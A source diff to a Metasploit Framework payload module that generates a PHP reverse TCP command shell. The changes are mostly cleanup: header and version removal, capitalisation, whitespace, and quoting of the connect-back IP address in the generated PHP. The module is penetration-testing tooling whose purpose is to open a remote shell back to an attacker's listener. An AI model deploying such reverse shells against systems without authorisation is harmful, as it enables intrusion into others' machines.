@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -23,8 +19,7 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
-			'Version'       => '$Revision$',
+			'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',
 			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
 			'Author'        => 'egypt',
 			'License'       => BSD_LICENSE,
@@ -59,17 +54,17 @@ module Metasploit3
 			port = datastore['LPORT']
 		end
 		exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)
-		
+
 		uri = "tcp://#{ipaddr}"
 		socket_family = "AF_INET"
 
 		if Rex::Socket.is_ipv6?(ipaddr)
 			uri = "tcp://[#{ipaddr}]"
 			socket_family = "AF_INET6"
-		end		
+		end
 
 		shell=<<-END_OF_PHP_CODE
-		$ipaddr=#{ipaddr};
+		$ipaddr='#{ipaddr}';
 		$port=#{port};
 		#{php_preamble({:disabled_varname => "$dis"})}
 
